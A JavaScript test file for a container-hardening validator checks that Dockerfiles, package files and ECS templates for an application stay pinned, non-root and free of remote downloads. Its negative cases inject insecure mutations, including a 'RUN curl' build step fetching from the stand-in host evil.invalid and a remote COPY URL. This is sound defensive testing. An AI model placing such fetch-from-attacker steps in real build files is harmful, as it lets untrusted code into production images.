import assert from 'node:assert/strict';
import { Buffer } from 'node:buffer';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import process from 'node:process';
import test from 'node:test';
import { fileURLToPath, URL } from 'node:url';

import { validateOciBuildMetadata } from './validate-oci-build-metadata.mjs';
import {
  NODE_BASE_IMAGE,
  RDS_BUNDLE_SHA256,
  validateProductionContainerSources,
} from './validate-production-containers.mjs';

const repositoryRoot = resolve(fileURLToPath(new URL('../..', import.meta.url)));
const validatorPath = join(repositoryRoot, 'infra/containers/validate-production-containers.mjs');

function loadSources() {
  return {
    apiDockerfile: readFileSync(join(repositoryRoot, 'Dockerfile.api'), 'utf8'),
    apiPackage: readFileSync(join(repositoryRoot, 'apps/api/package.json'), 'utf8'),
    applicationTemplate: readFileSync(
      join(repositoryRoot, 'infra/aws/application-baseline.yaml'),
      'utf8',
    ),
    dockerignore: readFileSync(join(repositoryRoot, '.dockerignore'), 'utf8'),
    migrationTemplate: readFileSync(
      join(repositoryRoot, 'infra/aws/database-migration-task.yaml'),
      'utf8',
    ),
    nextConfig: readFileSync(join(repositoryRoot, 'apps/web/next.config.ts'), 'utf8'),
    rdsBundle: readFileSync(join(repositoryRoot, 'infra/containers/aws-rds-global-bundle.crt')),
    rdsChecksum: readFileSync(
      join(repositoryRoot, 'infra/containers/aws-rds-global-bundle.crt.sha256'),
      'utf8',
    ),
    rootPackage: readFileSync(join(repositoryRoot, 'package.json'), 'utf8'),
    webPackage: readFileSync(join(repositoryRoot, 'apps/web/package.json'), 'utf8'),
    webDockerfile: readFileSync(join(repositoryRoot, 'Dockerfile.web'), 'utf8'),
  };
}

function replace(source, field, before, after) {
  assert.ok(source[field].includes(before), 'fixture must contain ' + before);
  return { ...source, [field]: source[field].replace(before, after) };
}

function assertRejected(source, pattern) {
  const result = validateProductionContainerSources(source);
  assert.equal(result.valid, false);
  assert.match(result.errors.join('\n'), pattern);
}

test('accepts the reviewed production container contract deterministically', () => {
  const first = validateProductionContainerSources(loadSources());
  const second = validateProductionContainerSources(loadSources());

  assert.deepEqual(second, first);
  assert.equal(first.valid, true);
  assert.deepEqual(first.errors, []);
  assert.equal(first.baseImage, NODE_BASE_IMAGE);
  assert.equal(first.rdsBundleSha256, RDS_BUNDLE_SHA256);
});

test('rejects mutable, changed, or architecture-pinned base images', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', NODE_BASE_IMAGE, 'node:24.20.0-bookworm-slim'),
    /pin every stage/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'FROM node:', 'FROM alpine:'),
    /pin every stage/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'FROM node:', 'FROM --platform=linux/amd64 node:'),
    /architecture|pin every stage/u,
  );
});

test('rejects root users, shell commands, entrypoints, and port drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'USER 10001:10001', 'USER root'),
    /UID\/GID 10001/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'CMD ["node", "dist/main.js"]', 'CMD node dist/main.js'),
    /exec-form default command|exact exec-form/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'ENTRYPOINT []', 'ENTRYPOINT ["sh"]'),
    /clear the base image shell entrypoint/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'EXPOSE 3000', 'EXPOSE 8080'),
    /expose port 3000/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', '/usr/local/bin/corepack', '/tmp/corepack'),
    /remove build-time package managers/u,
  );
});

test('rejects ADD, context-wide copies, ad-hoc downloads, and remote URLs', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'COPY package.json', 'ADD package.json'),
    /must not use ADD/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', 'COPY package.json package-lock.json ./', 'COPY . ./'),
    /complete build context/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'RUN ["npm", "install"',
      'RUN curl https://evil.invalid/x\nRUN ["npm", "install"',
    ),
    /ad-hoc remote|no URL/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'COPY apps/web/package.json',
      'COPY https://evil.invalid/package.json',
    ),
    /ad-hoc remote|no URL/u,
  );
});

test('rejects secret-shaped build arguments and lifecycle-script enablement', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'ARG OCI_SOURCE\n', 'ARG OCI_SOURCE\nARG API_TOKEN\n'),
    /credentials|validated OCI/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'NPM_CONFIG_IGNORE_SCRIPTS=true',
      'NPM_CONFIG_IGNORE_SCRIPTS=false',
    ),
    /lifecycle scripts disabled/u,
  );
});

test('rejects image timestamp normalization drift', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'apiDockerfile',
      'ARG OCI_SOURCE=\n',
      'ARG OCI_SOURCE=https://github.com/Trey-Gleason/Crypto-lending\n',
    ),
    /fail-closed metadata defaults/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'ARG SOURCE_DATE_EPOCH=0', 'ARG SOURCE_DATE_EPOCH=1'),
    /timestamp normalization/u,
  );
});

test('rejects npm, lock-install, and workspace command drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'apiDockerfile', 'npm@11.6.4', 'npm@latest'),
    /repository-pinned npm/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', '"ci", "--workspace"', '"install", "--workspace"'),
    /exact workspace lock with npm ci/u,
  );
  assertRejected(
    replace(
      source,
      'rootPackage',
      '"packageManager": "npm@11.6.4"',
      '"packageManager": "npm@11.7.0"',
    ),
    /packageManager/u,
  );
});

test('rejects a production Solana SDK dependency or missing built-runtime guard', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'apiPackage',
      '"dependencies": {',
      '"dependencies": {\n    "@solana/web3.js": "1.98.4",',
    ),
    /outside both production dependency graphs/u,
  );
  assertRejected(
    replace(
      source,
      'webDockerfile',
      'RUN ["node", "infra/containers/validate-built-runtime.mjs", "web", "apps/web/.next/standalone"]',
      'RUN ["node", "--version"]',
    ),
    /built-runtime dependency boundary/u,
  );
});

test('rejects build-context allowlist weakening or accidental source omission', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'dockerignore', '**/.env\n', '**/.env\n!.git/\n'),
    /build-context allowlist/u,
  );
  assertRejected(
    replace(source, 'dockerignore', '!apps/web/lib/**\n', ''),
    /build-context allowlist/u,
  );
});

test('rejects standalone web assembly and runtime binding drift', () => {
  const source = loadSources();
  assertRejected(
    replace(source, 'webDockerfile', '.next/standalone /app', '.next/server /app'),
    /standalone server/u,
  );
  assertRejected(
    replace(source, 'nextConfig', "output: 'standalone'", 'output: undefined'),
    /standalone output/u,
  );
  assertRejected(
    replace(source, 'webDockerfile', 'HOSTNAME=0.0.0.0', 'HOSTNAME=127.0.0.1'),
    /every task interface/u,
  );
});

test('rejects API, worker, and migration command or hardening mismatch with ECS', () => {
  const source = loadSources();
  assertRejected(
    replace(
      source,
      'applicationTemplate',
      '      Essential: true\n      Image: !Ref ApiImageUri',
      '      Command: [node, other.js]\n      Essential: true\n      Image: !Ref ApiImageUri',
    ),
    /API task must retain/u,
  );
  assertRejected(
    replace(
      source,
      'applicationTemplate',
      'Command: [node, dist/infrastructure/outbox/outbox-worker.cli.js]',
      'Command: [node, worker.js]',
    ),
    /Worker task commands/u,
  );
  assertRejected(
    replace(
      source,
      'migrationTemplate',
      'dist/infrastructure/database/migration.cli.js',
      'dist/migrate.js',
    ),
    /Migration task command/u,
  );
  assertRejected(
    replace(source, 'applicationTemplate', "User: '10001:10001'", "User: '0:0'"),
    /task user/u,
  );
});

test('rejects RDS bundle substitution, checksum drift, and path drift', () => {
  const source = loadSources();
  const changedBundle = Buffer.from(source.rdsBundle);
  changedBundle[100] ^= 1;
  assertRejected({ ...source, rdsBundle: changedBundle }, /bundle digest/u);
  assertRejected(
    replace(source, 'rdsChecksum', RDS_BUNDLE_SHA256, '0'.repeat(64)),
    /checksum sidecar/u,
  );
  assertRejected(
    replace(source, 'apiDockerfile', '/etc/ssl/certs/aws-rds-global-bundle.pem', '/tmp/rds.pem'),
    /trust bundle/u,
  );
});

test('OCI metadata validation rejects unsafe defaults and malformed values', () => {
  const valid = {
    OCI_CREATED: '2026-09-04T12:00:00Z',
    OCI_REVISION: '1'.repeat(40),
    OCI_SOURCE: 'https://github.com/Trey-Gleason/Crypto-lending',
    SOURCE_DATE_EPOCH: '0',
  };
  assert.deepEqual(validateOciBuildMetadata(valid), []);
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_REVISION: '0'.repeat(40) }).join(),
    /explicit nonzero/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_CREATED: '2026-02-31T12:00:00Z' }).join(),
    /canonical UTC/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, OCI_SOURCE: 'https://evil.invalid/repo' }).join(),
    /canonical repository/u,
  );
  assert.match(
    validateOciBuildMetadata({ ...valid, SOURCE_DATE_EPOCH: '1' }).join(),
    /SOURCE_DATE_EPOCH/u,
  );
});

test('CLI emits a stable local-only JSON report and rejects arguments', () => {
  const accepted = spawnSync(process.execPath, [validatorPath, '--json'], {
    cwd: repositoryRoot,
    encoding: 'utf8',
    env: {},
  });
  assert.equal(accepted.status, 0, accepted.stderr);
  const report = JSON.parse(accepted.stdout);
  assert.equal(report.valid, true);
  assert.equal(report.baseImage, NODE_BASE_IMAGE);

  const rejected = spawnSync(process.execPath, [validatorPath, '--root', '.'], {
    cwd: repositoryRoot,
    encoding: 'utf8',
    env: {},
  });
  assert.equal(rejected.status, 2);
  assert.match(rejected.stderr, /Usage:/u);
});
